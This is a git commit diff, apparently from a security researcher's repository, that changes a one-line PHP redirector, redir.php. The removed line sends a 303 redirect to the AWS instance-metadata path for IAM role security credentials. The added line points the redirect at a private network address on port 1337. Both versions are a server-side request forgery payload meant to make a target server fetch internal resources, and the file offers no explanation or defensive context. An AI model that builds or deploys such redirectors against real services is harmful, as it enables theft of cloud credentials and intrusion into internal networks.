a544dbc337e2912364aa0c6d3d5484e07b381756
Tengku Arya Saputra <33353823+AryaSec1337@users.noreply.github.com>
2023-09-10 04:15:29 +0700

    Update redir.php

--- redir.php
+++ redir.php
@@ -1,3 +1,3 @@
 <?php 
-header('Location: http://180.244.167.51/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303); 
+header('Location: http://192.168.1.5:1337', TRUE, 303); 
 ?>
